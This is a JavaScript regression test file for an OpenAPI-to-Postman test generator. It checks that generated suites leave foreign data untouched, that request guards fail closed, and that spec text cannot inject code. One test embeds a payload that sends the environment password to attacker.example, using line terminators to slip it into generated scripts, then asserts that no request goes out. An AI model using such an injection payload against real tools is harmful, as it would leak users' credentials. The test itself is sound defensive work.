/**
 * Regression tests for the data-safety and injection findings of the branch review.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { generateSuite } from '../src/core/suite.js';
import { OpenAPIParser } from '../src/parsers/openapi-parser.js';
import { PositiveTestGenerator } from '../src/generators/positive-generator.js';
import { NegativeTestGenerator } from '../src/generators/negative-generator.js';
import { TestScriptGenerator } from '../src/generators/test-script-generator.js';
import { js } from '../src/core/escape.js';
import { toJsonSchema, generateExample } from '../src/core/schema.js';
import { kitchenSpec, startKitchenMock } from './fixtures/kitchen.js';
import { tempDir, writeJson, runNewman, requestItems, scriptOf } from './helpers.js';

async function kitchenSuite(options = {}) {
  const dir = await tempDir('stp-kitchen-');
  const specPath = await writeJson(path.join(dir, 'kitchen.json'), kitchenSpec);
  const result = await generateSuite({ specPath, outputDir: path.join(dir, 'out'), ...options });
  const read = async marker => JSON.parse(await fs.readFile(path.join(result.outputDir, result.files.find(f => f.includes(marker))), 'utf8'));
  const dataFile = result.files.find(f => f.includes('_iteration_data.'));
  return {
    result,
    positive: await read('_Positive.'),
    negative: await read('_Negative.'),
    environment: await read('_environment.'),
    dataFile: dataFile ? path.join(result.outputDir, dataFile) : undefined,
  };
}

const MUTATING = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);
/** Mutating requests that touch data the run did not create. */
function foreignMutations(requests) {
  return requests.filter(r => MUTATING.has(r.method) && (
    /^\/orders\/\d+/.test(r.path)            // list-captured, no create endpoint
    || r.path === '/tickets/t1/'             // listed ticket (trailing-slash resource, no create endpoint)
    || /^\/files\//.test(r.path)             // value from the environment
    || (r.method === 'DELETE' && r.path === '/todos') // collection-level delete
    || (/^\/(todos|users)\/(\d+)$/.test(r.path) && Number(r.path.split('/').pop()) < 500)
  ));
}

test('generated suites never modify data the run did not create', async () => {
  const { positive, negative, environment, result } = await kitchenSuite();
  for (const [name, collection] of [['positive', positive], ['negative', negative]]) {
    const mock = await startKitchenMock();
    try {
      const outcome = await runNewman(collection, environment, mock.url);
      assert.deepEqual(foreignMutations(mock.requests).map(r => `${r.method} ${r.path}`), [], `${name} suite modified foreign data`);
      assert.ok(outcome.skipped.length > 0, `${name}: unsafe requests are skipped with a log line`);
    } finally {
      await mock.close();
    }
  }
  const warnings = result.warnings.join('\n');
  for (const op of ['DELETE /todos', 'PUT /orders/{id}/status', 'POST /orders/{id}/cancel', 'DELETE /files/{name}.json', 'DELETE /tickets/{ticket_id}/']) {
    assert.ok(warnings.includes(op), `warning for ${op}`);
  }
});

test('positive suite passes on the kitchen spec: oneOf with discriminator and cyclic schemas validate', async () => {
  const { positive, environment } = await kitchenSuite();
  const mock = await startKitchenMock();
  try {
    const outcome = await runNewman(positive, environment, mock.url);
    assert.deepEqual(outcome.failures, [], outcome.failures.map(f => `${f.item} :: ${f.test} :: ${f.message}`).join('\n'));
    const created = mock.requests.filter(r => r.method === 'DELETE' && /^\/todos\/5\d\d$/.test(r.path));
    assert.equal(created.length, 1, 'the created todo is deleted');
  } finally {
    await mock.close();
  }
});

test('data-driven columns do not shadow credentials and CSV strings stay strings', async () => {
  const { positive, environment, dataFile } = await kitchenSuite({ dataFormat: 'csv', rowCount: 3 });
  const header = (await fs.readFile(dataFile, 'utf8')).split('\n')[0];
  assert.ok(header.split(',').every(c => c.startsWith('body.')), header);
  const mock = await startKitchenMock();
  try {
    await runNewman(positive, environment, mock.url, dataFile);
    const logins = mock.requests.filter(r => r.path === '/login');
    assert.equal(logins.length, 3);
    for (const login of logins) assert.deepEqual(login.body, { username: 'admin', password: 's3cret' });
    const users = mock.requests.filter(r => r.method === 'POST' && r.path === '/users');
    assert.equal(users.length, 3);
    for (const user of users) {
      assert.equal(typeof user.body.zip, 'string', JSON.stringify(user.body));
      assert.match(user.body.code, /^\d{4}$/);
      assert.equal(typeof user.body.username, 'string');
    }
    assert.equal(users[0].body.code, '0000');
  } finally {
    await mock.close();
  }
});

test('trailing-slash paths keep the slash and non-existent ids are fake values', async () => {
  const dir = await tempDir();
  const spec = await new OpenAPIParser().parse(await writeJson(path.join(dir, 'k.json'), kitchenSpec));
  const negative = requestItems(new NegativeTestGenerator(spec).generate());
  const ticketTests = negative.filter(i => i.name.includes('/tickets/{ticket_id}/'));
  const missing = ticketTests.find(i => i.name.includes('non-existent "ticket_id"'));
  assert.ok(missing, ticketTests.map(i => i.name).join('\n'));
  assert.match(missing.request.url.raw, /\/tickets\/does-not-exist-\{\{\$timestamp\}\}\/$/);
  assert.ok(!negative.some(i => i.name.includes('non-existent "id"') && i.name.includes('/orders/')), 'bounded integer ids get no non-existent test');
  assert.ok(!negative.some(i => i.name.includes('""')), 'no tests for an empty parameter name');
});

test('readOnly required fields get no missing-field test; spec gaps are not duplicated', async () => {
  const dir = await tempDir();
  const spec = await new OpenAPIParser().parse(await writeJson(path.join(dir, 'k.json'), {
    ...kitchenSpec,
    components: { ...kitchenSpec.components, schemas: { ...kitchenSpec.components.schemas,
      Todo: { type: 'object', required: ['id', 'title', 'done'], properties: { id: { type: 'integer', readOnly: true }, title: { type: 'string' }, done: { type: 'boolean' } } },
    } },
  }));
  const generator = new NegativeTestGenerator(spec);
  const names = requestItems(generator.generate()).map(i => i.name);
  assert.ok(!names.some(n => n.includes('missing required field "id"')));
  assert.ok(names.some(n => n.includes('POST /todos - missing required field "title"')));
  const keys = generator.specGaps.map(g => `${g.operation}|${g.scenario}`);
  assert.equal(new Set(keys).size, keys.length, keys.join('\n'));
});

test('guard fails closed on runners without pm.execution.skipRequest', () => {
  const script = TestScriptGenerator.guardScript({ label: 'x', ownedVars: ['orders_id'] }).join('\n');
  const updates = [];
  const calls = [];
  const store = values => ({ get: k => values[k] });
  const pm = {
    variables: store({ orders_id: '1' }),
    collectionVariables: store({}),
    request: {
      url: { update: u => updates.push(u) },
      headers: { clear: () => calls.push('headers') },
      authorizeUsing: mode => calls.push(`auth:${mode}`),
      body: { update: b => calls.push(`body:${b.raw}`) },
    },
  };
  new Function('pm', 'console', script)(pm, { warn() {} });
  assert.deepEqual(updates, ['http://127.0.0.1:9/request-skipped']);
  assert.deepEqual(calls, ['headers', 'auth:noauth', 'body:'], 'credentials and body are stripped');
});

test('fail-closed fallback sends nothing to the API in a real Newman run', async () => {
  const { startMock } = await import('./fixtures/restful-booker-mock.js');
  const guard = TestScriptGenerator.guardScript({ label: 'x', ownedVars: ['booking_id'] })
    .map(line => line.replace(/pm\.execution\.skipRequest/g, 'pm.execution.skipRequestMissing'));
  const collection = {
    info: { name: 'fallback', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' },
    item: [{
      name: 'guarded delete',
      event: [{ listen: 'prerequest', script: { exec: guard } }],
      request: { method: 'DELETE', header: [{ key: 'Cookie', value: 'token=abc123token' }], url: '{{baseUrl}}/booking/1' },
    }],
  };
  const mock = await startMock();
  try {
    await runNewman(collection, { values: [{ key: 'booking_id', value: '1' }] }, mock.url);
    assert.deepEqual(mock.requests, [], 'the API received no request');
    assert.ok(mock.bookings.has(1));
  } finally {
    await mock.close();
  }
});

test('guard skips when an environment value shadows the captured id', () => {
  const script = TestScriptGenerator.guardScript({ label: 'x', ownedVars: ['todos_id'] }).join('\n');
  let skipped = 0;
  const store = values => ({ get: k => values[k] });
  const run = effective => {
    const pm = {
      variables: store({ todos_id: effective }),
      collectionVariables: store({ todos_id: 501, todos_id__created: 'true' }),
      execution: { skipRequest: () => { skipped++; } },
      request: { url: { update() {} } },
    };
    new Function('pm', 'console', script)(pm, { warn() {} });
  };
  run('501');
  assert.equal(skipped, 0, 'captured id in use: runs');
  run('1');
  assert.equal(skipped, 1, 'shadowed by another value: skipped');
});

test('line terminators in spec text cannot escape comments or literals', async () => {
  const dir = await tempDir();
  const attack = "pm.sendRequest('https://attacker.example/?pw=' + pm.environment.get('password'));//";
  const spec = await new OpenAPIParser().parse(await writeJson(path.join(dir, 'nl.json'), {
    openapi: '3.0.3', info: { title: `T\n${attack}`, version: '1' },
    paths: Object.fromEntries(['\n', '\r', ' ', ' '].map((sep, i) => [`/items${i}${sep}${attack}`, {
      post: {
        summary: `s${sep}${attack}`,
        requestBody: { content: { 'application/json': { schema: { type: 'object', required: [`f${sep}${attack}`], properties: { [`f${sep}${attack}`]: { type: 'string' } } } } } },
        responses: { 201: { description: 'ok' } },
      },
    }])),
  }));
  const sent = [];
  const chain = new Proxy(function stub() {}, { get: (t, k) => (k === 'then' ? undefined : chain), apply: () => chain });
  const store = () => ({ get() {}, set() {}, unset() {}, has: () => false, toObject: () => ({}) });
  const pm = {
    test: (n, fn) => { try { fn(); } catch { /* stubbed assertions */ } }, expect: () => chain,
    response: { code: 201, responseTime: 1, to: chain, json: () => ({}), text: () => '', headers: { get: () => '', has: () => false } },
    collectionVariables: store(), environment: store(), variables: store(), iterationData: { toObject: () => ({}) },
    execution: { skipRequest() {} }, request: { url: { update() {} } }, sendRequest: (...a) => sent.push(a),
  };
  let scripts = 0;
  for (const collection of [new PositiveTestGenerator(spec).generate(), new NegativeTestGenerator(spec).generate()]) {
    for (const item of requestItems(collection)) {
      for (const listen of ['prerequest', 'test']) {
        const code = scriptOf(item, listen);
        if (!code) continue;
        scripts++;
        new Function('pm', 'console', code)(pm, { log() {}, warn() {} });
      }
    }
  }
  assert.ok(scripts > 10);
  assert.deepEqual(sent, []);
});

test('js() keeps "__proto__" keys as own properties', () => {
  const value = JSON.parse('{"__proto__": {"type": "string"}, "a": 1}');
  const roundTrip = new Function(`return ${js(value)};`)();
  assert.deepEqual(Object.keys(roundTrip), ['__proto__', 'a']);
  assert.equal(Object.getPrototypeOf(roundTrip), Object.prototype);
});

test('contract schemas and request examples stay small for mutually referencing schemas', () => {
  const schemas = Array.from({ length: 10 }, (_, i) => ({ type: 'object', properties: { name: { type: 'string', title: `S${i}` } } }));
  for (const s of schemas) for (const [i, other] of schemas.entries()) s.properties[`link${i}`] = other;
  const out = JSON.stringify(toJsonSchema(schemas[0]));
  assert.ok(out.length < 20000, `schema is ${out.length} bytes`);
  const started = Date.now();
  const example = JSON.stringify(generateExample(schemas[0]));
  assert.ok(example.length < 50000, `example is ${example.length} bytes`);
  assert.ok(Date.now() - started < 1000, 'example generation is fast');
});
